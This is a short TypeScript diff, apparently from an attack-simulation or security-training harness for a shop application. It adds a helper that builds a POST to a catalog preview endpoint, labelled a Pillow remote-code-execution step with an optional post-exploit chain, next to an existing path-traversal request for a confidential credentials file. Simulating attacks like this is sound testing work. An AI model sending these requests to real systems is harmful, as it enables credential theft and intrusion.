@@ -63,6 +63,19 @@ export const TRAVERSAL_FILE = "../confidential/api-credentials.txt";
 export const TRAVERSAL_SHOP_PATH =
   `/api/legacy/download?file=${encodeURIComponent(TRAVERSAL_FILE)}`;
 
+/** Create-A-Board preview — Pillow RCE + optional post-exploit chain (real shop path). */
+export function catalogPreviewStep(
+  chain: string[],
+  label = "catalog-preview"
+): ShopTrafficStep {
+  return {
+    method: "POST",
+    path: "/api/catalog/preview",
+    body: { design: "fish-twin", chain },
+    label,
+  };
+}
+
 export const YAML_CHECKOUT_BODY = {
   items: [
     {
